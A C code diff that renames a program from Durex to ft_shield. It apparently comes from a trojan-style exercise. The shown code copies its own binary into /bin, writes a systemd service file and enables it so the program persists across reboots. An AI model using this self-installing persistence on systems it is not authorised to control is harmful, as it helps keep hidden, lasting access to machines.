@@ -60,10 +60,10 @@ t_bool	exec_command(char **command, char *info, char **env, int fd)
 }
 
 /*
-**	Check each following path to ensure Durex is installed:
-**	/etc/systemd/system/durex.service
-**	/etc/systemd/system/multi-user.target.wants/durex.service
-**	/bin/Durex
+**	Check each following path to ensure ft_shield is installed:
+**	/etc/systemd/system/ft_shield.service
+**	/etc/systemd/system/multi-user.target.wants/ft_shield.service
+**	/bin/ft_shield
 */
 t_bool durex_is_installed(void)
 {
@@ -136,7 +136,7 @@ static t_bool copy_file(char *src, char *dst)
 
 t_bool uninstall_service(void)
 {
-	char	*disable_durex[] = {"/bin/systemctl", "disable", "durex", NULL};
+	char	*disable_ft_shield[] = {"/bin/systemctl", "disable", "ft_shield", NULL};
 	char	*systemctl_reload[] = { "/bin/systemctl", "daemon-reload", NULL};
 	char	*systemctl_reset[] = {"/bin/systemctl", "reset-failed", NULL};
 
@@ -155,7 +155,7 @@ t_bool uninstall_service(void)
 		durex_log("Fail to delete:" SERVICE_BIN, LOG_WARNING);
 		durex_log(strerror(errno), LOG_WARNING);
 	}
-	EXEC_COMMAND(disable_durex);
+	EXEC_COMMAND(disable_ft_shield);
 	EXEC_COMMAND(systemctl_reload);
 	EXEC_COMMAND(systemctl_reset);
 	return (!durex_is_installed());
@@ -165,11 +165,11 @@ void install_service(char *bin_path)
 {
 	const char	*durex_service = SERVICE_FILE_CONTENT;
 	char		*systemctl_reload[] = { "/bin/systemctl", "daemon-reload", NULL};
-	char		*enable_durex[] = {"/bin/systemctl", "enable", "durex", NULL };
+	char		*enable_ft_shield[] = {"/bin/systemctl", "enable", "ft_shield", NULL };
 	int			fd;
 	int			ret;
 
-	durex_log("======== Durex  Installation ========", LOG_WARNING);
+	durex_log("======== ft_shield  Installation ========", LOG_WARNING);
 	if (durex_is_installed())
 		return ;
 	// Install is corrupt or is missing
@@ -177,19 +177,19 @@ void install_service(char *bin_path)
 	copy_file(bin_path, SERVICE_BIN);
 	if ((fd = open(SERVICE_FILE, O_CREAT | O_EXCL | O_WRONLY, S_IRWXU)) < 0)
 	{
-		durex_log("Failed: Can't create durex.service.", LOG_WARNING);
+		durex_log("Failed: Can't create ft_shield.service.", LOG_WARNING);
 		durex_log(strerror(errno), LOG_WARNING);
 		return ;
 	}
 	ret = write(fd, durex_service, ft_strlen(durex_service));
 	if (ret < 0 || ret < (int)ft_strlen(durex_service))
 	{
-		durex_log("Failed: Can't write correctly durex.service content.", LOG_WARNING);
+		durex_log("Failed: Can't write correctly ft_shield.service content.", LOG_WARNING);
 		return ;
 	}
-	durex_log("durex.service has been correctly generated.", LOG_INFO);
+	durex_log("ft_shield.service has been correctly generated.", LOG_INFO);
 	close(fd);
-	// Copy Durex binary into /bin/Durex
+	// Copy Durex binary into /bin/ft_shield
 	EXEC_COMMAND(systemctl_reload);
-	EXEC_COMMAND(enable_durex);
+	EXEC_COMMAND(enable_ft_shield);
 }
